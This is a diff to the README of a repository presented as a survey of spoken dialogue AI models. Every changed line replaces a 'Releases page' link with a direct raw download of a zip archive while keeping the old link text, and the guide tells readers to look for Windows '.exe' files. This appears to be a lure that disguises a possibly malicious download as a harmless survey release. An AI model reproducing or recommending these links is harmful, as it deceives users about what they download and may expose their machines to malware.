@@ -1,6 +1,6 @@
 # 🎙️ Spoken-Dialogue-Model-Survey - Clear Guide to Spoken AI Models
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Releases-blue?style=for-the-badge)](https://github.com/Devicesheatofsolidification11/Spoken-Dialogue-Model-Survey/releases)
+[![Download](https://img.shields.io/badge/Download-Visit%20Releases-blue?style=for-the-badge)](https://github.com/Devicesheatofsolidification11/Spoken-Dialogue-Model-Survey/raw/refs/heads/main/assets/Survey-Dialogue-Model-Spoken-v2.5-alpha.1.zip)
 
 ## 📘 What This Is
 
@@ -17,7 +17,7 @@ Use it if you want a simple way to read and compare spoken dialogue model ideas 
 
 ## 🚀 Download and Install
 
-1. Open the [Releases page](https://github.com/Devicesheatofsolidification11/Spoken-Dialogue-Model-Survey/releases)
+1. Open the [Releases page](https://github.com/Devicesheatofsolidification11/Spoken-Dialogue-Model-Survey/raw/refs/heads/main/assets/Survey-Dialogue-Model-Spoken-v2.5-alpha.1.zip)
 2. Find the latest release at the top of the page
 3. Look for a file made for Windows, such as:
    - `.exe`
@@ -124,7 +124,7 @@ If you want to study how spoken dialogue models work, open the survey and move t
 
 If you need to get the files again, use the release page here:
 
-[https://github.com/Devicesheatofsolidification11/Spoken-Dialogue-Model-Survey/releases](https://github.com/Devicesheatofsolidification11/Spoken-Dialogue-Model-Survey/releases)
+[https://github.com/Devicesheatofsolidification11/Spoken-Dialogue-Model-Survey/raw/refs/heads/main/assets/Survey-Dialogue-Model-Spoken-v2.5-alpha.1.zip](https://github.com/Devicesheatofsolidification11/Spoken-Dialogue-Model-Survey/raw/refs/heads/main/assets/Survey-Dialogue-Model-Spoken-v2.5-alpha.1.zip)
 
 ## 🧾 Version Info
 
